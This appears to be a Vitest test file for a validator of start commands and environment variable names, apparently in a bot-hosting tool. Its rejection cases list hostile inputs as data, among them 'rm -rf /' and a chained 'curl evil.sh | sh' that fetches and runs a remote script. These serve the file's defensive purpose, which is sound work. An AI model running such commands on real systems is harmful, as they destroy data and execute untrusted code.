import { describe, expect, it } from 'vitest';
import { validateEnvKey, validateStartCommand } from '../src/validation';

describe('start command / env validation', () => {
  it.each(['npm start', 'node index.js', 'node --max-old-space-size=200 src/bot.js', 'npm run build && node dist/index.js'])('accepts %s', (c) => expect(validateStartCommand(c)).toBe(c));
  it.each(['rm -rf /', 'node index.js; curl evil.sh | sh', 'node $(whoami)', 'npm start > /etc/x', 'bash -c "x"', 'node a.js || x'])('rejects %s', (c) => expect(() => validateStartCommand(c)).toThrow());
  it('rejects reserved/invalid env names', () => { expect(() => validateEnvKey('PATH')).toThrow(); expect(() => validateEnvKey('1BAD')).toThrow(); expect(validateEnvKey('GUILD_ID')).toBe('GUILD_ID'); });
});
